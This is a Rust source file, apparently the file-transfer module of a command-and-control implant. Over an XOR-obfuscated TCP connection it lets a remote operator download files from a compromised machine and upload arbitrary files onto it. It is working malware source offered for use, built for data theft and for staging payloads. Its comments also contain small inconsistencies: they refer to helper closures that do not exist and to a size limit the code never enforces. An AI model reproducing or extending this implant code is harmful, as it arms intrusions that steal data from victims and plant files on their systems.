//! filetransfer.rs — file download + upload over the existing C2 socket
//!
//! Protocol (framed, over the same XOR-encrypted TCP connection):
//!
//! DOWNLOAD (implant → operator):
//!   Operator sends:  "download <remote_path>\n"
//!   Implant replies: "FILE_SIZE:<n>\n"  then  <n> raw bytes
//!
//! UPLOAD (operator → implant):
//!   Operator sends:  "upload <remote_path> <size>\n"
//!   Implant replies: "READY\n"
//!   Operator sends:  <size> raw bytes
//!   Implant replies: "OK\n"  or  "ERR:<message>\n"
//!
//! All bytes are XOR'd by the c2.rs layer before hitting the wire.
//! Max file size for single transfer: 512 MB (adjust CHUNK_SIZE as needed).

use std::fs;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::Path;

const CHUNK_SIZE: usize = 65536; // 64 KB per read chunk

/// Send a local file to the operator over the C2 stream.
/// `xor_send` and `xor_recv` are closures from c2.rs — keeps all wire
/// encoding in one place.
pub fn send_file(
    stream:   &mut TcpStream,
    path:     &str,
    xor_key:  &[u8],
) -> bool {
    let path = Path::new(path);
    if !path.exists() {
        let msg = format!("ERR:file not found: {}\n", path.display());
        xor_write(stream, msg.as_bytes(), xor_key);
        return false;
    }

    let data = match fs::read(path) {
        Ok(d) => d,
        Err(e) => {
            let msg = format!("ERR:{}\n", e);
            xor_write(stream, msg.as_bytes(), xor_key);
            return false;
        }
    };

    // Send size header
    let header = format!("FILE_SIZE:{}\n", data.len());
    xor_write(stream, header.as_bytes(), xor_key);

    // Send file bytes in chunks
    for chunk in data.chunks(CHUNK_SIZE) {
        xor_write(stream, chunk, xor_key);
    }
    true
}

/// Receive a file from the operator and write it to `path` on disk.
pub fn recv_file(
    stream:   &mut TcpStream,
    path:     &str,
    size:     usize,
    xor_key:  &[u8],
) -> bool {
    // Acknowledge ready
    xor_write(stream, b"READY\n", xor_key);

    let mut buf = vec![0u8; size];
    let mut received = 0usize;
    while received < size {
        let want = std::cmp::min(CHUNK_SIZE, size - received);
        let mut tmp = vec![0u8; want];
        match stream.read(&mut tmp) {
            Ok(0) | Err(_) => {
                xor_write(stream, b"ERR:connection dropped\n", xor_key);
                return false;
            }
            Ok(n) => {
                // XOR decode incoming bytes
                let start = received;
                for (i, b) in tmp[..n].iter().enumerate() {
                    buf[start + i] = if xor_key.is_empty() { *b } else { b ^ xor_key[(start + i) % xor_key.len()] };
                }
                received += n;
            }
        }
    }

    match fs::write(path, &buf) {
        Ok(_) => { xor_write(stream, b"OK\n", xor_key); true }
        Err(e) => {
            let msg = format!("ERR:{}\n", e);
            xor_write(stream, msg.as_bytes(), xor_key);
            false
        }
    }
}

// ---- internal XOR write helper ---------------------------------------------

fn xor_write(stream: &mut TcpStream, data: &[u8], key: &[u8]) {
    if key.is_empty() {
        let _ = stream.write_all(data);
    } else {
        let enc: Vec<u8> = data.iter().enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect();
        let _ = stream.write_all(&enc);
    }
    let _ = stream.flush();
}
